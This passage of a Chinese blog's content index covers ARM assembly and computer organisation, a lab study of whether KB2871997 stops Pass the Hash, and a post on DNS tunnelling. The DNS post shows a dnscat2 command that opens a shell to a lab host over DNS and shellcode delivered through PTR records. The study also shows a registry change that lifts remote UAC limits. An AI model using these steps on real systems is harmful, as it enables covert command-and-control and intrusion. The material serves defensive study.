指令编码\n\n这一节主要说了在32位的指令结构中，从0开始的第4位和第25位分别代表的含义：\n\n\n\n图中的移位长度和移位类型，就分别是下面指令后面加的LSL等移位指令和#后面带的移位长度\n\n```assembly\nMOV r3,r3, LSL #1\n```\n\n比如上面这个指令就是立即数移位，第25位为0，第4位也为0，移位类型为逻辑左移，移位长度为1","categories":["计算机基础"]},{"title":"计算机组成原理_3.4_ARM汇编语言","url":"/2021/01-16-计算机组成原理_3.4_ARM汇编语言/","content":"\n# ARM的指令格式\n\n```assembly\nLabel Op-code operand1, operand2, operand3\t;comment\n```\n\nLabel是用户定义的标号，由其他指令使用（如条件分支指令），用来引用标号所在的那一行。\n\n例：\n\n```assembly\nTest_5 ADD  r1,r1,r2 \n       SUBS r7,#1\t\t;循环计数器递减\n       BEQ  Test_5\t\t;为0则跳转到Test_5处\n```\n\n这样的指令符合语法，但是不能执行，因为还有程序结构的约束，汇编程序分为`可执行指令`和`伪指令`。下面将会说到这两种指令。\n\n# ARM程序结构\n\n例：\n\n```assembly\n        AREA ARMtest, CODE ,READONLY\t;伪指令,AREA定义代码段,段名称为ARMtest,属性为CODE和READONLY\n        ENTRY\t\t\t\t\t\t  ;伪指令,ENTRY表示程序入口\n        MOV    r0,#0\n        MOV    r1,#10\nNEXT    MUL    r2,r1,r1\n        MLA    r0,r2,r1,r0\n        SUBS   r1,r1,#1\n        BNE    NEXT\n        END\t\t\t\t\t\t\t  ;伪指令,表示程序结束\n```\n\n这里使用ARM的IDE进行编译执行，安装教程参考：https://blog.51cto.com/yxc6123/929558\n\n这里在`Ctrl+F5`执行之后会弹出一个反汇编窗口，图中红框圈出来的就是汇编代码的16进制格式\n\n![image-20210117164328488](计算机组成原理_3.4_ARM汇编语言.assets/image-20210117164328488.png)\n\n右边可以看到寄存器列表和寄存器中的值，上面的大括号为`单步执行`，或者直接按`F11`：\n\n![image-20210117164528641](计算机组成原理_3.4_ARM汇编语言.assets/image-20210117164528641.png)\n\n这里可以看到R15寄存器指向了`下一条要执行的指令`\n\n# 一些特殊指令\n\nEQU\t把一个名字和一个值绑定在一起，相当于C中的define，例：\n\n```\nTuesday EQU 2\n将Tuesday和2绑定\nADD r1,r2,#Tuesday\n等价于\nADD r1,r2,#2\n```\n\n## 伪指令DCD\n\nC语言在声明变量时，会直接分配内存空间：\n\n```\nint x;\nint y;\nchar key;\nint p = 4;\n```\n\n这四个语句定义了四个数据元素，并且为他们分配了内存空间，最后一个分配了内存空间并将其初始化为4。\n\n这些内存都是直接在栈中分配，这里有一个链接说明了堆栈的一些知识可以作为参考：https://www.da-quan.net/so-yywcsscs.html\n\n```\n栈中内存由系统分配，程序结束会自动释放\n堆中内存是自己申请的，用完不会自动释放，如不及时释放会导致内存泄露\n```\n\nARM的伪指令DCD起到的就是这个作用，`为常量和变量预留存储空间`，例：\n\n```assembly\nValue1 EQU 12\t;将名字Value1和12关联\nValue2 EQU 45\n\nTable DCD Value1\t;将字12保存在存储器中\n      DCD Value2\t;将字45保存在存储器中\n```\n\nDCD在存储器中预留了一个32位字的存储空间，并把12存储到这个存储空间内，存储单元的位置是由位置计数器来管理\n\n位置计数器实际上就是程序在汇编时指向下一个存储单元的指针\n\n## 伪指令DCB和DCW\n\n例1：\n\n```assembly\nQ1\tDCB\t\t25\t;将字节数据25保存在存储器中\nQ2\tDCB\t\t42\t;将字节数据42保存在存储器中\n```\n\n例2\n\n```assembly\nMess1 = \"This is message 1\", 0\n\tALIGN\n; ALIGN表示强制边界对齐，比如ALIGN的下一个地址为32位边界对其的\n```\n\n例3\n\n```\nMess1  DCB  \"This is message 1\", 0\n; 这一串字符串会被保存在存储器中，后面跟着数值0\n```\n\n例4\n\n```assembly\nQ3  DCW  12332\t\t;表示将16位数12342保存在存储器中,也就是两个字节\n```\n\n# 伪指令\n\n伪指令是程序员可以用的指令，但是不是ISA的一部分。下面说几个伪指令\n\n## ADR\n\nADR把地址加载到目的寄存器中，ADR是一个可以由程序员使用的伪操作或虚拟指令，之后汇编器将生成能完成同样功能的实际机器代码。\n\n```assembly\nADR  r1,MyArray\t\t;使r1指向MyArray，相当于取指针\n\nLDR  r3,[r1]\t\t;用指针读出一个元素\n\nMyArray\tDCD 0x12345678\n```\n\n## LDR\n\nLDR用指针读出一个元素并载入目标寄存器，例：\n\n```assembly\nLDR r0, = 0x12345678\n```\n\n把数据载入r0中，书中还涉及到了一个流水线的概念，在第6章再学习。","categories":["计算机基础"]},{"title":"计算机组成原理_3.3_ARM指令集体系结构","url":"/2021/01-16-计算机组成原理_3.3_ARM指令集体系结构/","content":"\nARM是一个32位的计算机，采用寄存器-寄存器型的体系结构，使用load/store指令在存储器和寄存器之间移动数据。\n\n# ARM寄存器集\n\nARM有16个程序员可见寄存器R0~R15\n\n```\n其中r0-r13这14个寄存器是通用寄存器\n\nr14存放子程序返回地址（链接寄存器）\n\nr15为程序计数器\n```\n\nARM的状态寄存器被称为`当前处理器状态寄存器CPSR`，也包括ZNCV等标志位。CPSR的低8位包含系统信息，比如ARM的工作状态和中断处理机制。\n\n在ARM中因为只有16个寄存器，所以指令集比较丰富，包括四操作数格式的指令\n\n# ARM指令集\n\n针对指令作用的分类方法：\n\n```\n数据移动\n算术运算\n逻辑运算\n移位\n程序控制\n```\n\n常见的指令集：\n\n```\nADD\t加\nSUB\t减\nAND\t与\nORR\t或\nEOR 异或\nMUL 乘\nMOV 寄存器-寄存器移动\nCMP 比较\nBEQ 相等跳转\n```\n\n全部的指令集可以参考：\n\nhttps://usermanual.wiki/Document/ARMAssemblyInstructions.709031950/html","categories":["计算机基础"]},{"title":"计算机组成原理_3.2_ISA的组成","url":"/2021/01-16-计算机组成原理_3.2_ISA的组成/","content":"# 什么是ISA和RISC\n\nISA全程是指令集体系结构（Instruction Set Architecture）\n\n精简指令集计算机（英語：reduced instruction set computer，缩写：*RISC*）\n\n# 组成ISA的三个部分\n\n```\n1、寄存器\n2、寻址方式\n3、指令格式\n```\n\n## 1、寄存器\n\n上一节中也简单的说了些寄存器相关的内容，一般来说CPU寄存器内可直接访问的数据越多，处理器的速度就越快\n\n### 什么是Load-store计算机\n\n计算机中的片内寄存器有限，所有的数据处理，都只能针对寄存器的内容，就需要不同的通过指令将数据在寄存器和内存之间传递\n\n也就是说，对存储器进行的操作只能是将数据传送到寄存器中或者从寄存器中取出数据。\n\n### 寄存器的大小\n\n寄存器的大小（也就是位宽）通常等于计算机完成的数据处理操作的最大位宽。\n\n16位的计算机的寄存器为16位，也就是说寄存器通常情况下是和总线的位宽相同的。总线的位宽决定了计算机的位数。\n\n## 2、寻址方式\n\n寻址方式有很多变种，下面是三种基本的寻址方式\n\n```\n立即数寻址\n直接寻址\n间接寻址\n```\n\n### 立即数寻址\n\n也就是通过立即操作数寻址，它不需要保存在存储器或者寄存器中，而是直接是指令的一部分。\n\n立即数寻址意味着操作数为常数，比如：\n\n```assembly\nADD r1,r2,#5\n等价于：\n[r1] <- [r2]+\n```\n\n或者是\n\n```assembly\nMOV AL,0x04\n;翻译成机器码为：\n0xB004\n;这个机器码是一个指令，其高字节为操作码：0xB0告诉CPU把一个立即数放入寄存器AL中（MOV AL, immed8），低字节0x04是操作数，代表立即数的值。\n```\n\n### 直接寻址\n\n直接寻址就是将操作数地址用作指令的一部分，\n\n```\n汇编：MOV AL， [0x04]\n\n机器码：0x8A0425**04000000**\n\n这里的操作码：0x8A0425告诉CPU从一个偏移地址的内存中取出一个字节数据到AL中。\n\n操作数: 0x04为该偏移地址，这里的0x04是一个立即数，只不过解释为偏移地址（是立即数，又是操作数，所以也可以成为立即操作数）。\n```\n\n### 间接寻址\n\n也称为相对寻址，或者是寄存器间接寻址，指令会给出包含操作数地址的寄存器的地址。\n\n相比前面立即数是指令的一部分，间接寻址需要三步操作：\n\n```\n1、读指令\n2、读含有操作数地址的寄存器\n3、读出实际的操作数\n```\n\n含有操作数地址的寄存器，被叫做指针寄存器。Load-store型计算机（比如ARM），使用这种寻址方式访问存储器操作数。\n\n```\n汇编：MOV AL，[RCX+0x04]\n\n机器码：8A4104\n\n操作码：0x8A41,告诉CPU利用RCX中的值和偏移量一起作为内存偏移地址，取出该偏移地址中内存的一个字节数据到AL中\n\n操作数：0x04，就是一个固定偏移量，是一个立即数，解释为地址偏移量。\n```\n\n这种方式对于访问表格和数组很有用，因为它可以操作指针寄存器访问数组元素。\n\n#### 微处理器的三种指令模式\n\n```\n存储器 - 寄存器型\n寄存器 - 存储器型\n寄存器 - 寄存器型\n```\n\n## 3、指令格式\n\n体系结构就是计算机指令本身，这是指令集的重点所在。\n\n在计算机中，指令长度是有限制的，如果一个计算机的字长为32位且寄存器也是32位，则其指令字长为32位宽。所以指令集的设计者会受到指令字长的约束。\n\n指令包含操作码和操作数，想要增加一个字段的长度，另一个就要减少，因为总的字长只有32位。\n\n```\n操作码位数 + 操作数位数 = 计算机字长\n```\n\n## 4、操作码与指令\n\n指令可以进行分类，下面是根据操作数地址的数量进行分类的几种指令：\n\n```assembly\n三地址\nADD r1,r2,r3\t;[r1] <- [r2]+[r3]\n\n双地址\nADD r1,r2\t\t;[r1] <- [r1]+[r2]\n\n单地址\nADD P\t\t\t;P和累加器相加，结果放入累加器\n\n零地址\nADD\t\t\t\t;从栈顶弹出两个数相加，结果放入栈顶\n```\n\n### 三地址计算机\n\n格式为：\n\n```\noperation destination,source1,source2\n```\n\n后两个为源操作数，第一个是目的操作数\n\n### 双地址计算机\n\n缺点是其中一个源操作数的内容会因为复写而被破坏。\n\n### 单地址计算机\n\n单地址计算机只有一个操作数，另一个操作数是使用了一个叫做累加器的固定寄存器，无需指定。\n\n```\nADD P\n等于\n[A] <- [A]+[P]\n```\n\n### 零地址计算机\n\n没有地址，也就是说只有操作码，也被称为栈计算机\n\n### 一个半地址计算机\n\nIntel IA32和Freescale系列通常称为一个半地址计算机，因为他们的指令指定了两个操作数，一个操作数是存储器地址，一个是寄存器地址，寄存器地址被称为半个地址。","categories":["计算机基础"]},{"title":"计算机组成原理_3.1_存储程序计算机","url":"/2021/01-15-计算机组成原理_3.1_存储程序计算机/","content":"\n# 什么是存储程序体系结构\n\n将程序和数据放在同一个存储空间内，采用取指-执行模式执行，即按照顺序从内存读取指令、译码、执行。\n\n这样的计算机带有寄存器、算术逻辑运算单元（ALU）、存储器以及用来连接各个功能部件的总线。\n\n这一节其实就是主要了解什么是寄存器，以及处理器如何在计算时对寄存器存储的指令或者临时数据进行使用\n\n# 寄存器\n\n寄存器是位于CPU内部的存储单元，类似于内存中的存储单元。\n\n寄存器按照名字来访问，下面是不同的CPU对寄存器的命名：\n\n```\nARM:\nr0 r1 r2 --- r15\n\nIntel:\nAX,BX,CX,DX,SP,BP,SI...\n\nFreesacle:\nD0,D1,D2,D3...\n```\n\n寄存器按照功能来分不同的作用，下面是根据可见性分的寄存器类型\n\n```\n1、通用寄存器\nr0-r7寄存器（ARM中的命名方式），Intel中就是AX，BX这些，主要功能用于存放临时数据，比如计算结果\n在ARM中有16个通用寄存器，r0-r15，但是r14和r15都是通用寄存器，但是又扮演特殊角色。\n\n2、特殊功能寄存器\n对一个循环的次数进行计数的循环计数器，有的用来记录处理器的状态\n\n高速暂存寄存器\n用于保存数据或者数据单元的地址（指针）\n\n程序计数器（PC）\n记录了下一条指令的地址，也就是说程序计数器保持对程序执行的跟踪，PC有些场景也叫做指令指针\n\n3、不可见寄存器\n\nMAR\t存储器地址寄存器\n保存了读或者写操作正在访问的存储单元的地址\n\nMBR 存储器数据寄存器\n保存了刚从存储器中读出的数据，或将写入存储器的数据\n\nIR 指令寄存器\n存放最近从存储器中读出的指令，也就是当前正在执行的指令\n```\n\n\n\n# 处理器如何读出并执行指令\n\n处理器在读取并执行指令的时候，是如何使用这些寄存器的？\n\n这里使用RTL的方式描述在读取并执行指令`LDR r1,1234`时的操作\n\n```assembly\nFETCH [MAR] <- [PC]\t\t\t; 把PC的值复制到存储器地址寄存器\n      [PC]  <- [PC+4]\t\t; 把PC递增，指向下一条指令\n      [MBR] <- [[MAR]]\t\t; 读出地址为MAR的指令(读出的时候指令保存在了MBR中)\n      [IR]  <- [MBR]\t\t; 将指令从MBR复制到IR\n      \nLDR   [MAR] <- [IR(地址)]\t   ; 把IR中的操作数地址复制到MAR\n      [MBR] <- [[MAR]]\t\t; 将地址为MAR的操作数读到MBR中\n      [r1]  <- [MBR]\t\t; 把操作数移到寄存器r1\n```\n\n# 常量处理\n\n## 立即操作数和立即数\n\n立即数就是在操作数位置的立即数\n\n```\n立即操作数\nLDR r1,1234\n这里的1234就是立即操作数，1234是指地址为1234的存储单元的内容，也就是说这里的1234相当于一个指针\n\n立即数\n立即数是一个在运算中可以直接使用的数，需要用哈希符号#前缀来声明\n比如：\nLDR r1,#200\n表示，直接将常量200加载到寄存器r1中\n```\n\n# 流控制\n\n流控制是指计算机非顺序执行指令的能力\n\n流控制是反映计算机做出决策并在多个动作序列间选择的能力的关键因素\n\n这里比较相关的指令有：\n\n```assembly\nBEQ target\t; 如果先前的操作结果为0，则跳转到目标出\nBPL target  ; 如果前一操作的结果大于或等于0，则跳转到目标处\nB target    ; 无条件跳转，就是jump\n```\n\n这几个其实不属于ARM处理器的指令集，汇编器会自动把他们翻译成其他的等效指令\n\n## CCR 条件码寄存器\n\nCCR是CPU实现跳转的重要的寄存器\n\n算术逻辑运算单元（ALU）与PC连接，决定下一步执行哪一个指令，决定的因素就是依靠CCR\n\n![img](计算机组成原理_3.1_存储程序计算机.assets/7980283-a662871193d3a0fe.jpg)\n\n条件码寄存器CCR有4个码位：\n\n```\nZ\t零位\n\t在分支指令执行时，条件分支指令将完成以下动作的一个：\n\t\t1.Z为false，处理器从[PC]+4处取出下一条指令\n\t\t2.Z为true，程序计数器PC从指令寄存器的操作数字段，载入新的地址，并跳转到新的地址执行\nN\t借位位\nC\t负位\nV\t溢出位\n```\n\n不同的码位指明了不同的分支转移条件\n\nCCR 条件码寄存器，在ARM中被称为\"`当前处理器状态寄存器(CPSR)`\"，而在Intel中被叫做\"`状态寄存器`\"\n\n","categories":["计算机基础"]},{"title":"迷一样的KB2871997","url":"/2020/12-18-迷一样的KB2871997/","content":"\nFreebuf链接：https://www.freebuf.com/vuls/220740.html\n\n在内网渗渗透时，当我们通过GPP漏洞等方式获取到凭据后，将会使用这组凭据进行横向移动，进行权限提升。\n\n![1575809554771](迷一样的KB2871997.assets/1575809554771.png)\n\n 不管通过那种方式获取到了明文密码或者HASH，横向移动是必不可少的一步，攻击者会使用常见的Psexec式(psexec psexec_psh)，Wmi式(wmicmd、wmiexec)、winrm式(evil-winrm)这几种方式来远程执行命令，除了这几款之外，目前还有一款综合式的远程执行命令的工具（crackmapexec），此款工具支持多种执行方式，并且支持批量。攻击者通过此类型的方式从内网中的一台主机横向移动以求获得更多的内网主机权限以达到提升内网权限或者是获取关键信息的目的。\n\n在横向移动中有一种经久不衰的攻击的攻击是手法是Pass The Hash，Pass The Hash出现极大提升了攻击效率，利用windows的自认证机制而不需要破解HASH登录到系统中。\n\n微软为了解决这个问题在2014年发布的更新KB2871997一度被传言能够防御Pass The Hash，下面我们就来看一下是否真的是这样。\n\n![1575809565027](迷一样的KB2871997.assets/1575809565027.png)\n\n![1575809575527](迷一样的KB2871997.assets/1575809575527.png)\n\n## KB2871997安装前后测试\n\n首先看一下未安装补丁的情况，其中本地管理员组有三个帐户，主机名为TESTWIN7，所在域为TEST.LOCAL：\n\n```\nadministrator是RID为500的本地管理员账号\ntestpth是RID非500的本地账号\nTEST\\xxm为加入了本地Administrators组的域帐户\n```\n\n![1575809616032](迷一样的KB2871997.assets/1575809616032.png)\n\n首先使用本地帐户administrator：\n\n![1575809622427](迷一样的KB2871997.assets/1575809622427.png)\n\n使用本地管理组帐户testpth:\n\n![1575809631670](迷一样的KB2871997.assets/1575809631670.png)\n\n域用户xxm:\n\n![1575809638802](迷一样的KB2871997.assets/1575809638802.png)\n\n这里可以看到本地帐户administrator成功，本地管理员帐户testpth失败，域用户xxm成功，再来看一下安装补丁之后：\n\n![1575809658548](迷一样的KB2871997.assets/1575809658548.png)\n\n使用本地帐户administrator：\n\n![1575809666877](迷一样的KB2871997.assets/1575809666877.png)\n\n使用本地帐户testpth：\n\n![1575809673351](迷一样的KB2871997.assets/1575809673351.png)\n\n使用域帐户xxm：\n\n![1575809678589](迷一样的KB2871997.assets/1575809678589.png)\n\n安装KB2871997前后的对比发现并没有区别。而之前非administrator的本地管理员Pass The Hash失败被认为是KB2871997的作用，实际是由于远程访问和UAC的限制。\n\n## 远程访问和UAC\n\n图中可以看到在windows中administrator的RID为500，并且是唯一的。同样为管理员组的本地帐户的testpth的RID的值为1000。\n\n![1575809685471](迷一样的KB2871997.assets/1575809685471.png)\n\n而域账号xxm使用的是域内的SID号。\n\n![1575809694114](迷一样的KB2871997.assets/1575809694114.png)\n\n根据微软官方关于远程访问和用户帐户控制的相关文档可以了解到，UAC为了更好的保护Administrators组的帐户，会在网络上进行限制。https://support.microsoft.com/en-us/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows\n\n在使用本地用户进行远程登录时不会使用完全管理员权限（full administrator），但是在域用户被加入到本地管理员组之后，域用户可以使用完全管理员（full administrator）的Access Token运行，并且UAC不会生效。\n\n![1575809701102](迷一样的KB2871997.assets/1575809701102.png)\n\n由此可见在上面的实验中域用户xxm能够成功PTH，而本地用户testpth无法成功，是因为以testpth的身份发起的请求被UAC拒绝。而administrator用户成功的原因同样是因为UAC。\n\n### FilterAdministratorToken\n\n在UAC组策略设置和注册表项设置的官方文档（https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd835564(v=ws.10)#BKMK_BuiltInAdmin）中可以看到相关的描述，关于UAC的注册表中一个注册表键值为FilterAdministratorToken，且在Windows Server 2008默认为Disable。\n\n![1575809712292](迷一样的KB2871997.assets/1575809712292.png)\n\n紧跟着文档中就添加了关于Admin Approval Mode的说明：\n\n![1575809719735](迷一样的KB2871997.assets/1575809719735.png)\n\n在UAC的控制策略中对于内置administrator帐户运行程序时会直接赋予完全管理权限（full administrative privilege）。这就是本地帐户administrator和域帐户xxm成功而本地管理员帐户testpth失败的原因。\n\nWindows Server 2012相关的官方文档没有找到，但是在Windows Server 2012 R2版本服务器中可以看到本地安全策略中的“用户帐户控制：以管理员批准模式运行所有的管理员”已经默认开启。\n\n![1575809731260](迷一样的KB2871997.assets/1575809731260.png)\n\n现在将testwin7主机的FilterAdministratorToken设置为1。\n\n目录：\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n```\n\n![1575809743050](迷一样的KB2871997.assets/1575809743050.png)\n\n修改之后策略会立即生效，可以看到使用administrator的远程连接也被拒绝了\n\n![1575809750215](迷一样的KB2871997.assets/1575809750215.png)\n\n### LocalAccountTokenFilterPolicy\n\n上面我们知道了使用非administrator的本地管理员帐户testpth进行Pass The Hash为什么失败，那如何禁用UAC的限制？\n\n官方文档也是有提到的https://support.microsoft.com/en-us/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows\n\n可以通过修改注册表中LocalAccountTokenFilterPolicy选项的键值来进行更改。注册表项为\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n```\n\n如果LocalAccountTokenFilterPolicy注册表项不存在可以直接新建一条，并将值设置为1\n\nLocalAccountTokenFilterPolicy的值默认为0（开启远程限制），为1时将关闭远程限制\n\n![1575809762253](迷一样的KB2871997.assets/1575809762253.png)\n\n再次使用本地管理员账号testpth可以成功远程连接。\n\n![1575809772226](迷一样的KB2871997.assets/1575809772226.png)\n\n在防御远程访问的时候，这个注册表需要更加注意，默认情况下这个注册表键值为0，也就是说远程限制是开启的，如果由于误操作将此键值设置为1那无疑是对攻击者敞开了大门。\n\n## KB2871997\n\n事实证明KB2871997不能直接限制Pass The Hash，具体更改为以下几点。\n\n```\n1、支持“Protected Users”组；\n2、Restricted Admin RDP模式的远程桌面客户端支持；\n3、注销后删除LSASS中的凭据；\n4、添加两个新的SID；\n5、LSASS中只允许wdigest存储明文密码。\n```\n\n### 支持“Protected Users”组\n\n“Protected Users”组是Windows Server 2012 R2域中的安全组，“Protected Users”组的成员会被强制使用Kerberos身份验证，并且对Kerberos强制执行AES加密。\n\n![1575809799893](迷一样的KB2871997.assets/1575809799893.png)\n\n### Restricted Admin RDP模式的远程桌面客户端支持\n\nRestricted Admin RDP模式是为了避免将Client端的凭据暴露给远程系统，同时也产生一种变种的Pass The Hash（Passing the Hash with Remote Desktop），这里不再说明。同时这个功能只支持windows server 2012和windows8.1。\n\n![1575809806634](迷一样的KB2871997.assets/1575809806634.png)\n\n### 注销后删除凭证\n\n在这个更新之前，只要用户登录系统，Windows就会在lsass中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos的TGT票据/Session Key。\n\n### 新的SID\n\n在更新中新添加了两个SID:\n\n```\n本地帐户LOCAL_ACCOUNT（S-1-5-113）所有本地帐户继承自此SID。\n本地帐户和管理组成员LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP  （S-1-5-114）所有管理员组的本地用户继承此ID。\n```\n\n​         **注意**：S-1-5-114这里在中文操作系统中提供的翻译是“NT AUTHORITY\\本地帐户和管理员组成员” 但是实际上是“所有本地Administrators组中的本地帐户”，即域用户即使被加入到了本地Administrators组也不继承此SID。\n\n![1575809826037](迷一样的KB2871997.assets/1575809826037.png)\n\n这个SID对于限制横向渗透的远程连接并没有任何实质的作用，它的主要作用是更方便的防止通过网络使用本地帐户登录。对于防御人员来说我们可以通过将这两个SID对应的组加入组策略中的下列选项从而限制攻击者能够从外部访问本地系统/服务：\n\n```\n拒绝从网络访问这台计算机\n拒绝通过远程桌面服务登录\n```\n\n![1575809851966](迷一样的KB2871997.assets/1575809851966.png)\n\n当我们直接将这两个组加入拒绝访问列表的方式来禁用使用本地帐户进行网络访问时，可以看到使用本地administrator帐户提示“登录失败：未授予用户再次计算机上的请求登录类型”。同时也实验了只加入“本地帐户（S-1-5-113）”这一个SID对应的组，发现administrator依然被拒绝！\n\n![1575809887223](迷一样的KB2871997.assets/1575809887223.png)\n\n此时加入本地管理员组的域用户并不受影响，证明了上面的说法，也就是说其实这个补丁新添加的两个组在whoami /all里的中文翻译还是有一定的误导性的：\n\n![1575809894640](迷一样的KB2871997.assets/1575809894640.png)\n\n域管理员帐户administrator一样也可以成功\n\n![1575809901586](迷一样的KB2871997.assets/1575809901586.png)\n\n​         所以从实验结果来看这两个SID的作用就是将原本windows的本地组做了一个合并和处理，让用户在添加组策略时更方便一点，同时对于它们的关系来说S-1-5-114是S-1-5-113的子集，S-1-5-113包含所有本地用户，S-1-5-114包括的是Administrators组中的本地用户。\n\n![1575809910076](迷一样的KB2871997.assets/1575809910076.png)\n\n### LSASS中删除了明文凭证\n\n前面说到LSASS会存储用户的明文密码，这个更新只允许WDigest在LSASS中存储明文密码。如果想防止WDigest的明文密码存储在LSASS中则可以通过修改下面注册表的键值来实现：\n\n```\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n```\n\n如果UseLogonCredential值设置为0，则WDigest不会将凭据存储在内存中。\n\n如果UseLogonCredential值设置为1，WDigest将在内存中存储凭据。\n\n![1575809939954](迷一样的KB2871997.assets/1575809939954.png)\n\n修改注册表之后发现已经不能看到WDigest保存的明文密码（需重启或注销登录生效）。\n\n![1575809951446](迷一样的KB2871997.assets/1575809951446.png)\n\n## 小结\n\n看到这里防止Pass The Hash类型的横向移动的方法也很明显了：\n\n```\n1、将FilterAdministratorToken的值设置为1，限制本地administrator账户的远程登录；\n2、可以使用脚本或者人工定时查看LocalAccountTokenFilterPolicy是否曾经被攻击者修改过；\n3、在组策略中的“拒绝从网络访问这台计算机”将需要限制的组、用户加入到列表中。\n```\n\n而对于KB2871997的更新内容来说不管是“Protected Users”组和新的RDP模式以及新的SID号都没有起到实际的限制作用。\n\n新的两个SID组S-1-5-113和S-1-5-114也只是把本地用户划分了一下，同时这样做是没有太大意义的，在S-1-5-113能够包括所有本地用户的情况下再划分出来一个S-1-5-114组，现实中应该很少存在只是限制S-1-5-114（即管理员组的本地用户）而不限制所有本地用户的情况。同时如果是为了提升安全等级最好的方式是把Administrators组的域用户一起禁用，而不是只禁用Administrators的本地成员。\n\n唯一有点作用的就是在LSASS中删除了除WDigest之外的协议所保存的明文了但是他并不足以限制Pass The Hash这种类型的横向移动。","categories":["RedTeam&域安全"]},{"title":"由APT34工具Glimpse引申出的DNS隧道问题","url":"/2020/12-18-由APT34工具Glimpse引申出的DNS隧道问题/","content":"\n由于APT34工具的曝光，还有就是最近工作上关注了一下DNS隧道的检测，所以结合几个工具记录一下。\n\n## DNS隧道简介\n\nDNS协议是一个分布式的客户机/服务器网络数据库，分布式的原因是：互联网中没有单独的一个站点能够知道所有的信息。\n\n访问DNS是通过地址解析器的应用程序库来完成，在请求TCP打开一个连接或是使用UDP发送一个单播数据之前，需要知道ip地址。\n\n而DNS隧道就是通过DNS建立起来的一种隧道连接。\n\n## DNS的几种资源记录类型\n\n### 主机记录（A记录）：\n\n将DNS中的域名称对应到IPv4地址\n\n#### AAAA记录 IPV6解析记录：\n\n该记录是将域名解析到一个指定的IPV6的IP上。\n\n### PTR\n\n定义某个IP对应的域名，\n\n### CNAME (Canonical Name)记录，通常称别名解析\n\n可以将注册的不同域名都转到一个域名记录上，由这个域名记录统一解析管理，与A记录不同的是，CNAME别名记录设置的可以是一个域名的描述而不一定是IP地址\n\n### URL (Uniform Resource Locator )转发：网址转发\n\n如果你没有一台独立的服务器（也就是没有一个独立的IP地址）或者您还有一个域名B，您想访问A域名时访问到B域名的内容，这时您就可以通过URL转发来实现。 \n\nurl转发可以转发到某一个目录下，甚至某一个文件上。而cname是不可以，这就是url转发和cname的主要区别所在。\n\n### 服务位置记录（SRV记录）：\n\nRFC 2782定义，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。\n\n### NS（Name Server）记录是域名服务器记录\n\n用来指定该域名由哪个DNS服务器来进行解析，可以把一个域名的不同二级域名分别指向到不同的DNS系统来解析。\n\n### TXT记录：\n\nTXT记录一般是为某条记录设置说明，比如你新建了一条a.ezloo.com的TXT记录，TXT记录内容\"this is a test TXT record.\"，然后你用 nslookup -qt=txt a.ezloo.com ，你就能看到\"this is a test TXT record\"的字样。\n\n除外，TXT还可以用来验证域名的所有，比如你的域名使用了Google的某项服务，Google会要求你建一个TXT记录，然后Google验证你对此域名是否具备管理权限。\n\n## DNS隧道利用\n\n选几个算是比较有代表性的工具来说明一下。\n\n### DNSCAT2\n\nDNSCAT2的控制端使用的是Ruby，被控端使用编译好的exe文件，后来网上也有Powershell版本的dnscat。安装：\n\n```\ngit clone https://github.com/iagox86/dnscat2.git\n```\n\n然后ruby dnscat2.rb domain_name运行，这个domain_name需要能够被解析到，否则就不行，我这里本地实验所以把被控端的DNS地址改成了控制端的IP，否则被控端解析不到test域名。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image001.png)\n\n然后再被控端执行powershell脚本dnscat2.ps1\n\n```powershell\nStart-Dnscat2 -Domain test -DnsServer 192.168.144.130\n```\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image002.png)\n\n然后可以看到dnscat2这边已经反弹回了一个session 1\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image003.png)\n\n使用shell命令进行\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image004.png)\n\n通过抓包可以看到全部使用DNS协议进行数据通信，并且会随机采用三种不同类型的查询方式进行传输内容。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image005.png)\n\nDNSCAT还有一些其他的使用方式，具体不再说明。\n\n### NativePayload_DNS\n\nNativePayload_DNS不是利用DNS隧道来进行命令控制上传文件，而是利用DNS隧道来传输shellcode，也就是分离免杀，躲避杀软的静态检测。\n\n地址：https://github.com/DamonMohammadbagher/NativePayload_DNS\n\n这里作者提供的是c#的源代码，需要自己生成exe文件，我用的是\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image006.png)\n\n使用：\n\n首先将MSF生成的shellcode制作成IP+地址的格式\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image007.png)\n\n使用dnsspoof创建DNS服务器，并使用MSF开启监听。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image008.png)\n\n在win7主机上执行生成的exe文件\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image009.png)\n\n成功执行shellcode\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image010.png)\n\n原理：\n\n看下C#代码可以看到，原理其实很简单，代码也比较短。首先看其中存在一个包含DNS_PTR_A和DNSServer两个参数的函数__nslookup。\n\n使用ProcessStartInfo类接收nslookup.exe的返回值，比如nslookup.exe 1.1.1.1 192.168.144.130，对应的PTR记录（通过IP反查域名）就是0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image011.png)\n\n这里把地址的个数设置为了34，就是shellcode的行数，上面的dns.txt可以看到\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image012.png)\n\n然后通过循环遍历请求1.1.1.0-1.1.1.33对应的PTR记录，即可达到远程调用shellcode的目的。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image013.png)\n\n再看PCAP包，可以看到33个PTR请求，返回值为Dmain 